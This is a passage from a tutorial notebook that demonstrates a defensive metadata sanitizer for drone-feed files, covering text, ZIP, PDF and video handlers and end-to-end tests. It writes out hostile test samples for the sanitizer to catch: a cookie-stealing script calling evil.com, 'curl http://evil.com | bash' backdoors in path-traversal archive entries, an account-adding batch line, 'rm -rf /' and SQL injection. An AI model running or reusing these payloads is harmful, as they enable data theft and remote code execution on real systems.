the Python standard library — no external dependencies.

**Text-level threats in drone feeds:**

| Threat | How It Works | Example |
|---|---|---|
| **Null bytes** | Null bytes (`\x00`) can truncate string processing or bypass validation | `normal_data\x00<script>alert(1)</script>` |
| **BOM injection** | UTF-8 BOM (`\xEF\xBB\xBF`) can confuse parsers or hide content | BOM + `{"cmd": "rm -rf /"}` |
| **Embedded scripts** | HTML `<script>`, shell shebangs, `eval()` calls | `<script>fetch('http://evil.com')</script>` |
| **SQL injection** | SQL commands in telemetry data targeting downstream DBs | `DROP TABLE drone_logs;--` |
| **Control characters** | Non-printable chars can cause terminal injection or log manipulation | `\x1b[2J` (ANSI clear screen) |
| **Encoding attacks** | Mixed encodings cause different interpretations on different systems | Latin-1 chars misread as UTF-8 |

### 📊 Text Sanitization Pipeline

```
  Input text file
       │
  ┌───┴────────────────────────────────────────────┐
  │ Step 1: Strip BOM (\xEF\xBB\xBF)                    │
  ├────────────────────────────────────────────────┤
  │ Step 2: Strip null bytes (\x00)                      │
  ├────────────────────────────────────────────────┤
  │ Step 3: Normalize line endings (CRLF/CR → LF)       │
  ├────────────────────────────────────────────────┤
  │ Step 4: Strip control characters                     │
  ├────────────────────────────────────────────────┤
  │ Step 5: Detect & flag embedded script patterns        │
  ├────────────────────────────────────────────────┤
  │ Step 6: (STRIP mode only) Remove suspicious lines    │
  └────────────────────────────────────────────────┘
       │
       ▼
  Cleaned file (UTF-8, LF line endings, no null bytes)
```

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 8: Text Handler — Demo with multiple threat scenarios
# ─────────────────────────────────────────────────────────────────────────────

demo_dir = tempfile.mkdtemp(prefix='text_handler_demo_')
handler = TextHandler(SanitizerConfig(log_level='WARNING'))

def show_text_result(label, file_path, mode):
    output_path = file_path + '.clean'
    shutil.copy2(file_path, output_path)
    changes = handler.sanitize(output_path, output_path, mode)
    valid = handler.verify(output_path)

    print(f'\n{label}')
    print('-' * 50)
    print(f'  Mode:    {mode.value}')
    print(f'  Changes: {len(changes)}')
    for c in changes:
        print(f'    [{c.severity:8s}] {c.field}: {c.action} ({c.reason})')
    print(f'  Valid after: {valid} {"✅" if valid else "❌"}')

    # Show before/after content for small files
    with open(file_path, 'rb') as f:
        before = f.read()
    with open(output_path, 'rb') as f:
        after = f.read()
    print(f'  Before ({len(before)} bytes): {repr(before[:80])}')
    print(f'  After  ({len(after)} bytes): {repr(after[:80])}')


# Scenario 1: Text with null bytes
p1 = os.path.join(demo_dir, 'telemetry_nulls.txt')
with open(p1, 'wb') as f:
    f.write(b'speed=12.5\x00heading=145\x00battery=78\n')
show_text_result('🧪 Scenario 1: Null bytes in telemetry', p1, SanitizationMode.SELECTIVE)

# Scenario 2: BOM + CRLF line endings
p2 = os.path.join(demo_dir, 'log_bom.csv')
with open(p2, 'wb') as f:
    f.write(b'\xef\xbb\xbftimestamp,lat,lon\r\n2025-01-01,12.97,77.59\r\n')
show_text_result('🧪 Scenario 2: BOM + CRLF line endings', p2, SanitizationMode.SELECTIVE)

# Scenario 3: Embedded script in text
p3 = os.path.join(demo_dir, 'report_xss.txt')
with open(p3, 'w') as f:
    f.write('Flight Report #42\n')
    f.write('Status: nominal\n')
    f.write('<script>fetch("http://evil.com/steal?data="+document.cookie)</script>\n')
    f.write('Battery: 78%\n')
show_text_result('🧪 Scenario 3: Embedded HTML script (selective)', p3, SanitizationMode.SELECTIVE)
show_text_result('🧪 Scenario 3b: Same file in STRIP mode', p3, SanitizationMode.STRIP)

# Scenario 4: JSON telemetry
p4 = os.path.join(demo_dir, 'telemetry.json')
with open(p4, 'w') as f:
    json.dump({'speed': 12.5, 'heading': 145, 'battery': 78, 'note': 'normal ops'}, f)
show_text_result('🧪 Scenario 4: Clean JSON telemetry', p4, SanitizationMode.SELECTIVE)

shutil.rmtree(demo_dir, ignore_errors=True)
print('\n✅ Text handler demo complete')

---
## Section 9 — Archive Handler

### 🔵 Theory

The Archive Handler inspects ZIP and TAR files for structural threats.
Unlike other handlers, **archives are NOT modified** — the handler only reports findings.
Actual content analysis is delegated to the Malware Detection Engine.

**Archive-level threats:**

| Threat | How It Works | Detection |
|---|---|---|
| **Path traversal** | Filename like `../../../etc/passwd` escapes the extraction directory | Check for `../`, `..\\`, `/etc/`, `C:\\` |
| **Hidden executables** | `.exe`, `.dll`, `.bat` files hidden inside the archive | Check file extensions |
| **Zip bombs** | Extreme compression ratio exhausts memory on extraction | `uncompressed / compressed > 100` |
| **Hidden files** | Files starting with `.` (e.g., `.bashrc`) | Check for leading dot |
| **Double extensions** | `report.pdf.exe` disguised as a document | Count dots in filename |

### 📊 Archive Inspection Flow

```
  Archive file
       │
  ┌───┴───────────────────────────────────┐
  │ 1. Check archive comment                 │
  ├───────────────────────────────────────┤
  │ 2. Inspect each file entry:              │
  │    • Path traversal patterns?             │
  │    • Suspicious extension?                │
  │    • Double extension?                    │
  │    • Hidden file (starts with .)?          │
  │    • Oversized entry?                     │
  ├───────────────────────────────────────┤
  │ 3. Check compression ratio               │
  │    (potential zip bomb if > 100:1)        │
  └───────────────────────────────────────┘
       │
       ▼
  List of SanitizationChange (all flagged, none modified)
```

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 9: Archive Handler — Demo
# ─────────────────────────────────────────────────────────────────────────────

demo_dir = tempfile.mkdtemp(prefix='archive_handler_demo_')
handler = ArchiveHandler(SanitizerConfig(log_level='WARNING'))

# Scenario 1: Clean ZIP with normal files
clean_zip = os.path.join(demo_dir, 'clean_payload.zip')
with zipfile.ZipFile(clean_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('telemetry.json', '{"speed": 12.5, "heading": 145}')
    zf.writestr('log.csv', 'timestamp,lat,lon\n2025-01-01,12.97,77.59\n')
    zf.writestr('readme.txt', 'Flight data from DRONE-04')

meta = handler.extract_metadata(clean_zip)
changes = handler.sanitize(clean_zip, clean_zip, SanitizationMode.SELECTIVE)
print('📦 Scenario 1: Clean ZIP')
print(f'  Entries: {meta.get("_entry_count", 0)}')
print(f'  Findings: {len(changes)}')
for c in changes:
    print(f'    [{c.severity:8s}] {c.field}: {c.reason}')
if not changes:
    print('    (none — clean archive)')

# Scenario 2: ZIP with path traversal + executables
malicious_zip = os.path.join(demo_dir, 'malicious_payload.zip')
with zipfile.ZipFile(malicious_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('telemetry.json', '{"speed": 12.5}')
    zf.writestr('../../../etc/cron.d/backdoor', '* * * * * curl http://evil.com/shell.sh | bash')
    zf.writestr('payload.exe', 'MZ' + '\x00' * 100)
    zf.writestr('report.pdf.bat', '@echo off & net user hacker P@ss /add')
    zf.writestr('.hidden_config', 'C2_SERVER=evil.com')
    zf.comment = b'Totally legitimate archive, nothing to see here'

changes = handler.sanitize(malicious_zip, malicious_zip, SanitizationMode.SELECTIVE)
print(f'\n\n📦 Scenario 2: Malicious ZIP (path traversal + executables + hidden files)')
print(f'  Findings: {len(changes)}')
for c in changes:
    sev_emoji = '❌' if c.severity == 'critical' else '⚠\ufe0f' if c.severity == 'high' else '🔵'
    print(f'    {sev_emoji} [{c.severity:8s}] {c.field}')
    print(f'               {c.reason}')

# Scenario 3: ZIP bomb (extreme compression ratio)
bomb_zip = os.path.join(demo_dir, 'zip_bomb_test.zip')
# Create a file that compresses extremely well (repeated zeros)
with zipfile.ZipFile(bomb_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
    # 10 MB of zeros compresses to < 10 KB = ratio > 1000:1
    zf.writestr('huge.bin', '\x00' * (10 * 1024 * 1024))

meta = handler.extract_metadata(bomb_zip)
ratio = meta.get('_total_uncompressed', 0) / max(meta.get('_total_compressed', 1), 1)
changes = handler.sanitize(bomb_zip, bomb_zip, SanitizationMode.SELECTIVE)
print(f'\n\n📦 Scenario 3: Potential Zip Bomb')
print(f'  Compressed:   {meta.get("_total_compressed", 0):,} bytes')
print(f'  Uncompressed: {meta.get("_total_uncompressed", 0):,} bytes')
print(f'  Ratio:        {ratio:.1f}:1')
for c in changes:
    if 'bomb' in c.reason:
        print(f'  ❌ [{c.severity:8s}] {c.reason}')

shutil.rmtree(demo_dir, ignore_errors=True)
print('\n✅ Archive handler demo complete')

---
## Section 10 — PDF Handler

### 🔵 Theory

The PDF Handler removes JavaScript, auto-actions, embedded files, and suspicious
patterns from PDF documents. It uses **pikepdf** for PDF manipulation.

**PDF threats in drone/RPA feeds:**

PDFs may arrive as mission reports, flight logs, or compliance documents.
An attacker can inject JavaScript that executes when the file is opened:

```
PDF INTERNAL STRUCTURE (simplified)

  ┌────────────────────────────────────────────┐
  │ PDF Catalog (Root Object)                      │
  ├────────────────────────────────────────────┤
  │ /Pages          ─ Page tree (structural) ✅    │
  │ /JavaScript      ─ JS code execution  ❌ STRIP │
  │ /OpenAction      ─ Auto-trigger        ❌ STRIP │
  │ /AA              ─ Additional actions   ❌ STRIP │
  │ /Launch          ─ Run external app     ❌ STRIP │
  │ /EmbeddedFiles   ─ Hidden files         ❌ STRIP │
  │ /AcroForm        ─ Interactive forms     ❌ STRIP │
  │ /MediaBox        ─ Page dimensions      ✅ KEEP  │
  │ /Contents        ─ Page content          ✅ KEEP  │
  └────────────────────────────────────────────┘
```

The handler also scans decoded PDF streams for **suspicious patterns**:
- `eval()` calls, `app.launchURL()`, `this.submitForm()`
- NOP sleds (`\x90\x90\x90...`) indicating shellcode
- Heap spray patterns (`unescape()`, `String.fromCharCode()`)
- Embedded PE headers (`MZ` / `TVqQ`) in streams

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 10: PDF Handler — Demo
# ─────────────────────────────────────────────────────────────────────────────

# Check if pikepdf is available
if PdfHandler.is_available():
    import pikepdf
    demo_dir = tempfile.mkdtemp(prefix='pdf_handler_demo_')
    handler = PdfHandler(SanitizerConfig(log_level='WARNING'))

    # Create a PDF with dangerous elements
    pdf_path = os.path.join(demo_dir, 'flight_report.pdf')
    with pikepdf.new() as pdf:
        # Add a blank page
        pdf.add_blank_page(page_size=(612, 792))
        # Add document info
        with pdf.open_metadata() as meta:
            meta['dc:title'] = 'Flight Report - DRONE-04'
            meta['dc:creator'] = ['Dr. Bera']
        pdf.save(pdf_path)

    # Extract and display metadata
    print('PDF HANDLER DEMO')
    print('=' * 50)
    metadata = handler.extract_metadata(pdf_path)
    print('Extracted metadata:')
    for k, v in sorted(metadata.items()):
        print(f'  {k:35s} = {str(v)[:60]}')

    # Sanitize in selective mode
    output = os.path.join(demo_dir, 'flight_report_clean.pdf')
    shutil.copy2(pdf_path, output)
    changes = handler.sanitize(output, output, SanitizationMode.SELECTIVE)
    print(f'\nSelective mode changes: {len(changes)}')
    for c in changes:
        print(f'  [{c.severity:8s}] {c.field}: {c.action} ({c.reason})')
    if not changes:
        print('  (no dangerous elements found in this clean PDF)')

    valid = handler.verify(output)
    print(f'\nFile valid after sanitization: {valid} {"✅" if valid else "❌"}')

    shutil.rmtree(demo_dir, ignore_errors=True)

else:
    print('⚠\ufe0f pikepdf not installed — PDF Handler demo uses theory-only mode')
    print()
    print('  What the handler WOULD do if pikepdf were available:')
    print('  1. Open PDF with pikepdf')
    print('  2. Iterate catalog keys, strip dangerous ones (/JavaScript, /OpenAction, ...)')
    print('  3. Iterate pages, strip /AA (additional actions) and dangerous annotations')
    print('  4. In strip mode, clear all DocInfo entries')
    print('  5. Scan first 50 object streams for suspicious patterns')
    print('  6. Save sanitized PDF')
    print()
    print('  Install with: pip install pikepdf')
    print()

    # Show what the handler reports when unavailable
    handler = PdfHandler(SanitizerConfig(log_level='WARNING'))
    demo_dir = tempfile.mkdtemp(prefix='pdf_unavail_demo_')
    dummy = os.path.join(demo_dir, 'dummy.pdf')
    with open(dummy, 'w') as f:
        f.write('%PDF-1.4 dummy')

    changes = handler.sanitize(dummy, dummy, SanitizationMode.SELECTIVE)
    print('  Handler output when pikepdf is missing:')
    for c in changes:
        print(f'    [{c.severity:8s}] {c.field}: {c.reason}')

    shutil.rmtree(demo_dir, ignore_errors=True)

---
## Section 11 — Video Handler

### 🔵 Theory

The Video Handler sanitizes metadata in video and audio containers (MP4, MKV, AVI, OGG, FLAC).
It uses **mutagen** for metadata manipulation.

**Video metadata threats in drone feeds:**

Drone video is the primary payload in RPA feeds. Video containers embed metadata
in **atoms** (MP4) or **tags** (Matroska). Key threats:

| Atom/Tag | Threat | Example |
|---|---|---|
| `©xyz` | GPS coordinates embedded in user data | `+12.9716+077.5946/` |
| `©cmt` | Free-text comment (payload carrier) | Base64-encoded commands |
| `uuid` | Custom UUID boxes (arbitrary data) | Hidden C2 instructions |
| `covr` / `APIC` | Embedded cover art (can differ from content) | Steganographic image |
| `©too` / `encoder` | Encoder identification (fingerprinting) | Links videos to specific systems |

### 📊 Video Atom Structure (MP4)

```
  MP4 Container
  ┌────────────────────────────────────────────┐
  │ ftyp  ─ File type (structural)       ✅ KEEP │
  ├────────────────────────────────────────────┤
  │ moov  ─ Movie header                  ✅ KEEP │
  │   trak ─ Track container               ✅ KEEP │
  │   mvhd ─ Duration, timescale           ✅ KEEP │
  ├────────────────────────────────────────────┤
  │ mdat  ─ Media data (actual video)     ✅ KEEP │
  ├────────────────────────────────────────────┤
  │ udta  ─ User data                     ❌ STRIP│
  │   ©xyz ─ GPS coordinates              ❌ STRIP│
  │   ©cmt ─ Comment                      ❌ STRIP│
  │   ©too ─ Encoding tool                ⚠\ufe0f HIGH │
  │   covr ─ Cover art                    ❌ STRIP│
  │   uuid ─ Custom data boxes             ❌ STRIP│
  └────────────────────────────────────────────┘
```

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 11: Video Handler — Demo
# ─────────────────────────────────────────────────────────────────────────────

if VideoHandler.is_available():
    print('VIDEO HANDLER DEMO')
    print('=' * 50)
    print('✅ mutagen is available — full demo')
    # Note: Creating valid MP4/MKV files from scratch is complex.
    # In a real scenario, the handler would process actual drone video.
    # Here we show the handler's behavior with its strip sets.

    handler = VideoHandler(SanitizerConfig(log_level='WARNING'))

    print(f'\n  Supported MIME types ({len(handler.supported_mimes())}):')
    for m in sorted(handler.supported_mimes()):
        print(f'    {m}')

    from metadata_sanitizer.rules.video_rules import (
        VIDEO_ALWAYS_STRIP_ATOMS, VIDEO_STRIP_IN_HIGH_SECURITY, VIDEO_ALWAYS_PRESERVE
    )

    selective_strip = handler._get_strip_set(SanitizationMode.SELECTIVE)
    strip_strip = handler._get_strip_set(SanitizationMode.STRIP)

    print(f'\n  Tags stripped in SELECTIVE mode: {len(selective_strip)}')
    print(f'  Tags stripped in STRIP mode:     {len(strip_strip)}')
    print(f'  Tags always preserved:           {len(VIDEO_ALWAYS_PRESERVE)}')

else:
    print('⚠\ufe0f mutagen not installed — Video Handler demo uses theory-only mode')
    print()
    print('  What the handler WOULD do if mutagen were available:')
    print('  1. Open video/audio file with mutagen.File()')
    print('  2. Read all metadata tags')
    print('  3. Match tags against strip sets (always_strip + mode-specific)')
    print('  4. Remove matched tags, preserve structural ones')
    print('  5. Flag oversized atoms (> 1 MB) as potential payloads')
    print('  6. Save modified file')
    print()
    print('  Install with: pip install mutagen')
    print()
    print(f'  VIDEO_ALWAYS_STRIP_ATOMS: {len(VIDEO_ALWAYS_STRIP_ATOMS)} atoms')
    print(f'  VIDEO_STRIP_IN_HIGH_SECURITY: {len(VIDEO_STRIP_IN_HIGH_SECURITY)} atoms')
    print(f'  VIDEO_ALWAYS_PRESERVE: {len(VIDEO_ALWAYS_PRESERVE)} atoms')

---
## Section 12 — MetadataSanitizer Orchestrator

### 🔵 Theory

The `MetadataSanitizer` class is the **main orchestrator**. It ties everything together:
configuration, mode resolution, handler routing, forensic preservation, and verification.

### 📊 7-Stage Sanitization Pipeline

```
  MetadataSanitizer.sanitize_file() — Internal Pipeline

  ┌──────────────────────────────────────────────────────┐
  │ Stage 1: RESOLVE MODE                                    │
  │   Priority: mode_override > threat_score > flags > default│
  ├──────────────────────────────────────────────────────┤
  │ Stage 2: PRE-CHECKS                                      │
  │   File exists? Size < limit? MIME not excluded?           │
  ├──────────────────────────────────────────────────────┤
  │ Stage 3: GET HANDLER                                     │
  │   MIME → handler class. Check is_available().             │
  ├──────────────────────────────────────────────────────┤
  │ Stage 4: EXTRACT BEFORE-SNAPSHOT                         │
  │   Extract metadata, compute SHA-256 hash.                 │
  ├──────────────────────────────────────────────────────┤
  │ Stage 5: PRESERVE ORIGINAL (.orig copy)                  │
  │   Forensic backup before any modification.                │
  ├──────────────────────────────────────────────────────┤
  │ Stage 6: SANITIZE                                        │
  │   Delegate to handler.sanitize(). Collect changes.        │
  ├──────────────────────────────────────────────────────┤
  │ Stage 7: VERIFY & AFTER-SNAPSHOT                         │
  │   Re-parse file. If corrupt, restore from .orig.          │
  │   Extract after-snapshot, compute SHA-256 hash.           │
  └──────────────────────────────────────────────────────┘
       │
       ▼
  SanitizationResult
```

### Mode Resolution Priority

```
  Priority 1: mode_override (explicit caller override)
       │ not provided?
       ▼
  Priority 2: threat_score (T_S from Game-Theoretic Estimator)
       │ not provided?
       ▼
  Priority 3: insecure_flags (escalate if critical flags present)
       │ no critical flags?
       ▼
  Priority 4: config.default_mode ("selective")
```

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 12: MetadataSanitizer Orchestrator — End-to-End Demo
# ─────────────────────────────────────────────────────────────────────────────

demo_dir = tempfile.mkdtemp(prefix='orchestrator_demo_')

# Create a text file with multiple issues
txt_path = os.path.join(demo_dir, 'drone_telemetry.txt')
with open(txt_path, 'wb') as f:
    f.write(b'\xef\xbb\xbf')  # BOM
    f.write(b'speed=12.5\x00heading=145\r\n')  # null bytes + CRLF
    f.write(b'battery=78%\r\n')
    f.write(b'status=nominal\n')

# Initialize sanitizer with forensic settings
config = SanitizerConfig(
    default_mode='selective',
    preserve_originals=True,
    compute_before_after_hash=True,
    verify_after_sanitize=True,
    log_level='WARNING',
)
sanitizer = MetadataSanitizer(config)

# Sanitize with threat score
result = sanitizer.sanitize_file(
    artifact_id='artifact://drone_04_telemetry_001',
    file_path=txt_path,
    mime_type='text/plain',
    threat_score=0.5,  # Medium → selective mode
)

# Display full result
print('ORCHESTRATOR END-TO-END DEMO')
print('=' * 62)
result_dict = result.to_dict()

print(f'  Artifact ID:    {result_dict["artifact_id"]}')
print(f'  Filename:       {result_dict["filename"]}')
print(f'  File type:      {result_dict["file_type"]} ({result_dict["mime_type"]})')
print(f'  Mode used:      {result_dict["mode"]}')
print(f'  Handler:        {result_dict["handler_used"]}')
print(f'  Sanitized:      {result_dict["sanitized"]}')
print(f'  Processing:     {result_dict["processing_time_ms"]:.1f} ms')
print(f'  Valid after:    {result_dict["file_valid_after_sanitization"]}')

if result_dict.get('metadata_before_hash'):
    print(f'  Before hash:    {result_dict["metadata_before_hash"][:16]}...')
if result_dict.get('metadata_after_hash'):
    print(f'  After hash:     {result_dict["metadata_after_hash"][:16]}...')

print(f'\n  Changes ({len(result_dict["changes"])}):')
for c in result_dict['changes']:
    print(f'    [{c["severity"]:8s}] {c["field"]}: {c["action"]} ({c["reason"]})')

# Check forensic .orig backup exists
orig_path = txt_path + '.orig'
if os.path.exists(orig_path):
    print(f'\n  ✅ Forensic backup preserved at: {os.path.basename(orig_path)}')
    with open(orig_path, 'rb') as f:
        orig_content = f.read()
    with open(txt_path, 'rb') as f:
        clean_content = f.read()
    print(f'    Original: {len(orig_content)} bytes → Cleaned: {len(clean_content)} bytes')

# Show stats
print(f'\n  Sanitizer stats: {sanitizer.stats}')

shutil.rmtree(demo_dir, ignore_errors=True)

---
## Section 13 — Integration with Ingestion Interceptor

### 🔵 Theory

The Metadata Sanitizer integrates with the Ingestion Interceptor via the
`sanitize_artifact_record()` method. This method accepts an `ArtifactRecord.to_dict()`
dictionary and resolves the file path from the storage pointer.

```
INTEGRATION FLOW

  Ingestion Interceptor
  ┌───────────────────────────────────────────────────┐
  │ IngestResult                                          │
  │   └─ artifact_records: List[ArtifactRecord]            │
  │       ├─ artifact_id:     "artifact://abc123"           │
  │       ├─ filename:        "capture_001.jpg"             │
  │       ├─ mime:            "image/jpeg"                  │
  │       ├─ pointer_storage: "/data/store/DRONE-04/..."   │
  │       └─ security_flags:  ["double_extension"]          │
  └───────────────────────────────────────────────────┘
       │
       │  Game-Theoretic Estimator provides T_S
       ▼
  Metadata Sanitizer
  ┌───────────────────────────────────────────────────┐
  │ sanitizer.sanitize_artifact_record(                  │
  │     artifact_record=record.to_dict(),                │
  │     storage_base_path="/data/store",                 │
  │     threat_score=0.45,                               │
  │ )                                                     │
  └───────────────────────────────────────────────────┘
       │
       ▼
  SanitizationResult (passed to Threat Intelligence Correlator)
```

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 13: Integration with Ingestion Interceptor
# ─────────────────────────────────────────────────────────────────────────────

demo_dir = tempfile.mkdtemp(prefix='integration_demo_')

# Simulate what the Ingestion Interceptor would produce
# (ArtifactRecord.to_dict() output)

# Create actual files
txt_file = os.path.join(demo_dir, 'telemetry.json')
with open(txt_file, 'w') as f:
    json.dump({'speed': 12.5, 'heading': 145, 'battery': 78}, f)

csv_file = os.path.join(demo_dir, 'flight_log.csv')
with open(csv_file, 'wb') as f:
    f.write(b'timestamp,lat,lon\r\n')
    f.write(b'2025-01-01T00:00:00Z,12.97,77.59\r\n')

# Simulated ArtifactRecord dicts from Ingestion Interceptor
artifact_records = [
    {
        'artifact_id': 'artifact://drone_04_json_001',
        'filename': 'telemetry.json',
        'mime': 'application/json',
        'pointer_storage': txt_file,
        'security_flags': [],
    },
    {
        'artifact_id': 'artifact://drone_04_csv_002',
        'filename': 'flight_log.csv',
        'mime': 'text/csv',
        'pointer_storage': csv_file,
        'security_flags': [],
    },
]

# Initialize sanitizer
config = SanitizerConfig(
    default_mode='selective',
    preserve_originals=False,  # Don't clutter demo
    log_level='WARNING',
)
sanitizer = MetadataSanitizer(config)

# Process artifacts with different threat scores
print('INTEGRATION DEMO: Ingestion Interceptor → Metadata Sanitizer')
print('=' * 62)

threat_scenarios = [
    ('Low threat (T_S=0.2)', 0.2),
    ('Medium threat (T_S=0.5)', 0.5),
    ('High threat (T_S=0.85)', 0.85),
]

for label, ts in threat_scenarios:
    print(f'\n  --- {label} ---')
    for record in artifact_records:
        result = sanitizer.sanitize_artifact_record(
            artifact_record=record,
            threat_score=ts,
        )
        d = result.to_dict()
        print(f'    {d["filename"]:25s} mode={d["mode"]:12s} changes={len(d["changes"]):2d} sanitized={d["sanitized"]}')

# Batch processing
print(f'\n\nBATCH PROCESSING')
print('-' * 50)
batch_result = sanitizer.sanitize_batch(
    artifact_records=artifact_records,
    threat_score=0.5,
)
bd = batch_result.to_dict()
print(f'  Total processed:  {bd["summary"]["total_processed"]}')
print(f'  Total sanitized:  {bd["summary"]["total_sanitized"]}')
print(f'  Total changes:    {bd["summary"]["total_changes"]}')
print(f'  Total time:       {bd["summary"]["total_processing_time_ms"]:.1f} ms')

shutil.rmtree(demo_dir, ignore_errors=True)

---
## Section 14 — End-to-End Test with Multiple Scenarios

Four files covering the full range of realistic scenarios a drone feed would produce.

In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# SECTION 14: End-to-End Test — 4 Realistic Scenarios
# ─────────────────────────────────────────────────────────────────────────────

demo_dir = tempfile.mkdtemp(prefix='e2e_test_')

config = SanitizerConfig(
    default_mode='selective',
    preserve_originals=True,
    compute_before_after_hash=True,
    verify_after_sanitize=True,
    log_level='WARNING',
)
sanitizer = MetadataSanitizer(config)

print('=' * 62)
print('  END-TO-END PIPELINE TEST — 4 FILES')
print('=' * 62)

results = []

# ── File 1: Text file with null bytes and embedded scripts ─────────────────
f1 = os.path.join(demo_dir, 'flight_notes.txt')
with open(f1, 'wb') as f:
    f.write(b'\xef\xbb\xbf')  # BOM
    f.write(b'Mission: Perimeter survey\x00\x00\r\n')
    f.write(b'Status: Complete\r\n')
    f.write(b'<script>document.location="http://c2.evil.com"</script>\n')
    f.write(b'Battery: 45%\n')

r1 = sanitizer.sanitize_file(
    artifact_id='artifact://drone_04_notes_001',
    file_path=f1,
    mime_type='text/plain',
    threat_score=0.5,
)
results.append(r1)
d1 = r1.to_dict()
print(f'\n📝 File 1: Text with null bytes + embedded script')
print(f'   Mode: {d1["mode"]}  |  Sanitized: {d1["sanitized"]}  |  Changes: {len(d1["changes"])}')
for c in d1['changes']:
    print(f'   [{c["severity"]:8s}] {c["field"]}: {c["action"]} ({c["reason"]})')

# ── File 2: ZIP with path traversal and executables ───────────────────────
f2 = os.path.join(demo_dir, 'drone_payload.zip')
with zipfile.ZipFile(f2, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('data/telemetry.json', '{"speed": 12.5}')
    zf.writestr('../../../tmp/backdoor.sh', '#!/bin/bash\ncurl http://evil.com | bash')
    zf.writestr('tools/scanner.exe', 'MZ' + '\x00' * 50)
    zf.writestr('.env', 'SECRET_KEY=hackme123')

r2 = sanitizer.sanitize_file(
    artifact_id='artifact://drone_04_payload_002',
    file_path=f2,
    mime_type='application/zip',
    threat_score=0.7,  # High threat → strip mode
)
results.append(r2)
d2 = r2.to_dict()
print(f'\n📦 File 2: ZIP with path traversal + executables (T_S=0.7)')
print(f'   Mode: {d2["mode"]}  |  Sanitized: {d2["sanitized"]}  |  Changes: {len(d2["changes"])}')
for c in d2['changes']:
    print(f'   [{c["severity"]:8s}] {c["field"]}: {c["action"]} ({c["reason"]})')

# ── File 3: JSON telemetry (clean) ─────────────────────────────────────────
f3 = os.path.join(demo_dir, 'telemetry_clean.json')
with open(f3, 'w') as f:
    json.dump({
        'drone_id': 'DRONE-04',
        'timestamp': '2025-01-15T14:30:00Z',
        'speed_kmh': 45.2,
        'altitude_m': 120,
        'heading_deg': 145,
        'battery_pct': 78,
        'gps': {'lat': 12.9716, 'lon': 77.5946},
    }, f, indent=2)

r3 = sanitizer.sanitize_file(
    artifact_id='artifact://drone_04_telem_003',
    file_path=f3,
    mime_type='application/json',
    threat_score=0.15,  # Low threat → audit_only
)
results.append(r3)
d3 = r3.to_dict()
print(f'\n📐 File 3: Clean JSON telemetry (T_S=0.15)')
print(f'   Mode: {d3["mode"]}  |  Sanitized: {d3["sanitized"]}  |  Changes: {len(d3["changes"])}')
for c in d3['changes']:
    print(f'   [{c["severity"]:8s}] {c["field"]}: {c["action"]} ({c["reason"]})')
if not d3['changes']:
    print('   (no issues found — clean telemetry)')

# ── File 4: Text with SQL injection in CSV ─────────────────────────────────
f4 = os.path.join(demo_dir, 'waypoints.csv')
with open(f4, 'w') as f:
    f.write('id,name,lat,lon\n')
    f.write('1,base,12.97,77.59\n')
    f.write("2,'; DROP TABLE waypoints;--,0,0\n")
    f.write('3,target,13.08,77.58\n')

r4 = sanitizer.sanitize_file(
    artifact_id='artifact://drone_04_waypoints_004',
    file_path=f4,
    mime_type='text/csv',
    threat_score=0.5,
)
results.append(r4)
d4 = r4.to_dict()
print(f'\n🗂\ufe0f  File 4: CSV with SQL injection attempt (T_S=0.5)')
print(f'   Mode: {d4["mode"]}  |  Sanitized: {d4["sanitized"]}  |  Changes: {len(d4["changes"])}')
for c in d4['changes']:
    print(f'   [{c["severity"]:8s}] {c["field"]}: {c["action"]} ({c["reason"]})')

# ── Summary Table ─────────────────────────────────────────────────────────
print(f'\n\n{"=" * 62}')
print(f'  RESULTS SUMMARY')
print(f'{"=" * 62}')
print(f'{"File":30s} {"Mode":12s} {"Changes":>8s} {"Sanitized":>10s}')
print('-' * 62)
for r in results:
    d = r.to_dict()
    emoji = '✅' if not d['sanitized'] else '⚠\ufe0f' if len(d['changes']) < 5 else '❌'
    print(f'{emoji} {d["filename"]:28s} {d["mode"]:12s} {len(d["changes"]):>8d} {str(d["sanitized"]):>10s}')

total_changes = sum(len(r.to_dict()['changes']) for r in results)
total_sanitized = sum(1 for r in results if r.sanitized)
print(f'\n  Total files:     {len(results)}')
print(f'  Total sanitized: {total_sanitized}')
print(f'  Total changes:   {total_changes}')

# Cumulative stats
print(f'\n  Sanitizer cumulative stats: {sanitizer.stats}')

shutil.rmtree(demo_dir, ignore_errors=True)
print('\n✅ End-to-end test complete')

---
## Section 15 — Quick Reference Card

```
METADATA SANITIZER — QUICK REFERENCE
════════════════════════════════════════════════════════════

MODULE POSITION IN PIPELINE:
  ① Ingestion Interceptor
  → ② Game-Theoretic Threat Estimator
  → ③ Inspection Strategy Selector
  → ④ Multi-Layer Malware Detection Engine
  → [⑤ METADATA SANITIZER] ← YOU ARE HERE
  → ⑥ Threat Intelligence Correlator
  → ⑦ Response & Quarantine Manager
  → ⑧ Logging & Feedback Loop
  → ⑨ Security Dashboard

THREE MODES:
  strip       — Remove ALL non-essential metadata (T_S >= 0.7)
  selective    — Remove known-dangerous fields only (0.3 < T_S < 0.7)
  audit_only   — Log findings, modify nothing (T_S <= 0.3)

FIVE HANDLERS:
  ImageHandler   — EXIF/IPTC/XMP in JPEG/PNG/TIFF (Pillow + piexif)
  TextHandler    — Encoding, scripts, null bytes (stdlib)
  ArchiveHandler — ZIP/TAR path traversal, zip bombs (stdlib)
  PdfHandler     — JavaScript, auto-actions, forms (pikepdf)
  VideoHandler   — GPS atoms, comments, cover art (mutagen)

QUICK START:
  from metadata_sanitizer import MetadataSanitizer, SanitizerConfig

  config = SanitizerConfig(default_mode="selective")
  sanitizer = MetadataSanitizer(config)

  result = sanitizer.sanitize_file(
      artifact_id="artifact://abc123",
      file_path="/path/to/image.jpg",
      mime_type="image/jpeg",
      threat_score=0.45,
  )

INTEGRATION WITH INGESTION INTERCEPTOR:
  result = sanitizer.sanitize_artifact_record(
      artifact_record=artifact.to_dict(),
      storage_base_path="/data/drone_store",
      threat_score=0.45,
  )

KEY OUTPUT FIELDS:
